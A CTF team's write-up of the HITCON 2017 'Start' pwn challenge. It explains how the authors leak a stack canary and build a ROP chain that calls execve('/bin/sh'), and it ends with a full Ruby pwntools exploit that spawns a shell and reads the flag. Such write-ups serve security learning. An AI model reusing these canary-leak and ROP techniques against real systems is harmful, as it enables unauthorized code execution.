---
layout: post
title:  "HITCON CTF 2017 Quals: Start"
author: wolvg, gast04, roman
categories: writeup
tags: [cat/pwn, tool/pwntools, lang/C, lang/ruby]
---

* **Category:** pwn
* **Points:** 132
* **Description:** Have you tried pwntools-ruby?

Provided files:
- start
- server.rb

# Observations

The remote server expects us to send a Ruby script.
Now we can understand the hint with pwntools-ruby.

```sh
$ nc 54.65.72.116 31337
The binary "start" is listening at 127.0.0.1:31338.
This is not important, but the Ruby version running is: 2.4.2
Give me your Ruby script, I would run it for you ;)
>
```

It's a statically linked x86-64 binary.
This is the reason for the quite large size of nearly 900 KB.
But the main function is very limited.
Only one loop that reads up to 217 characters from the commandline into a 24 byte buffer and prints it afterwards.
I guess you know what to do.
But wait, stack canaries are found!
The loop ends only, if exit is entered.

## Vulnerability

As indicated before, a stack based buffer overflow was found.
Since stack canaries are enabled, the canary value has to be leaked first.
This is possible because we got a loop with unlimited cycles.
The first step is to write an exploit for the local binary.
We are used to Python pwntools and using that first.
Next it will be adopted to Ruby pwntools to be sent to the server.


# Solution

### Leaking the Canary

If we fill the complete buffer with printable characters, the puts will print the canary value for us, in theory.
One special thing about canaries is, that the least significant byte (LSB) is always null.
The null byte would terminate a string if the buffer is full.
We will send 24 'A' with a newline.
The newline replaces the null byte.
Now we can read the canary, if no null byte is in the random canary value.
In this rare case, just run it again.

### ROP chain

Our goal is to execute a shell.
To archive this goal we make use of return oriented programming (ROP).
First we will use read to read the string "/bin/sh\0" to a known writeable address.
The .bss segment is suitable:

```python
bss = 0x6cdb60 # address to write the string "/bin/sh\0"

r = ROP('start')
r.call("read", [0, bss, len("/bin/sh\x00")])
```

The snippet starts the pwntools ROP chain builder with our vulnerable binary and a call of the read function.
This automatically searches for ROP gadgets.
All arguments for the function calls are loaded into the registers using `pop` instructions.
Keep the linux x86-64 calling convention in mind!

```
0x0000:         0x4005d5 pop rdi; ret
0x0008:              0x0
0x0010:         0x4017f7 pop rsi; ret
0x0018:         0x6cdb60
0x0020:         0x443776 pop rdx; ret
0x0028:              0x8
0x0030:         0x440300 read
```

Since the ROP chain will be placed on the stack at the place of the return address of main, the program returns to the gadget.
For example the first gadget is placed at 0x4005d5 in our binary. It pops the first argument to rdi.

```
0x004005d5      pop rdi
0x004005d6      ret
```

The next step in our attack is to call the execv syscall.
The syscall instruction expects the syscall number in the rax register.
We manually found a ROP gadget to handle this.
It also pops rdx and rbx, not used, but we put nulls on the stack for this.

```
0x0047a781      pop rax
0x0047a782      pop rdx
0x0047a783      pop rbx
0x0047a784      ret
```

Let us continue our ROP chain:

```python
r.raw(0x47a781)        # ROP gadget: pop rax; pop rdx; pop rbx; ret
r.raw(59) # execve syscall number
r.raw(0)
r.raw(0)
```

Now the last step is to call the syscall.
We found a syscall instruction in the binary at 0x4003fc.
The rax is set with the last gadget, and the bss address ("/bin/sh\0") is correctly set as first argument using pwntools.

```python
syscall = 0x4003fc # address with a syscall instruction
r.call(syscall, [bss, 0, 0])
```

## Marshalling the payload

Now it's time to put it together.
- Writing the whole buffer.
- Writing the known stack canary.
- Add some padding to get to the return address.
- Place the ROP chain.

```python
payload = "c"*24 + p64(can) + "d"*8 + r.chain()

proc.send(payload)
proc.sendline("exit")
proc.sendline("/bin/sh\0")
proc.sendline("ls")
proc.interactive()
```
After sending the payload we exit the main loop and the main function return.
The path to sh is sent, and in the end a command is executed on the shell.


## Attacking the remote server

Usually it's easy to attack the remote system using pwntools.
Just replace the `process` with a `remote` and fire!
In our case the server executes a Ruby script to attack the vulnerable binary.

Let's think about, how to adopt our attack script:
- We need to rewrite the canary stuff.
- We can export the ROP chain from python, and import it into the Ruby script.

Full exploit:

```ruby
require 'pwn'
context.arch = 'amd64'
context.log_level = :debug
p = Sock.new '127.0.0.1', 31338
chain = "\xd5\x05@\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xf7\x17@\x00\x00\x00\x00\x00`\xdbl\x00\x00\x00\x00\x00v7D\x00\x00\x00\x00\x00\x08\x00\x00\x00\x00\x00\x00\x00\x00\x03D\x00\x00\x00\x00\x00\xf6\x02@\x00\x00\x00\x00\x00\x81\xa7G\x00\x00\x00\x00\x00;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xd5\x05@\x00\x00\x00\x00\x00`\xdbl\x00\x00\x00\x00\x00\xf7\x17@\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00v7D\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xfc\x03@\x00\x00\x00\x00\x00naaboaab".force_encoding("ASCII-8BIT")
to_exec = "/bin/sh\x00"
p.sendline "A"*24
all = p.recv
can_raw = "\x00"+all.split("\n")[1][0..6]
can = u64(can_raw)
payload = "c"*24+p64(can)+"d"*8+chain
p.send payload
p.sendline "exit"
p.sendline to_exec
p.sendline "cat /home/start/flag"
print p.recv
print p.recv
```

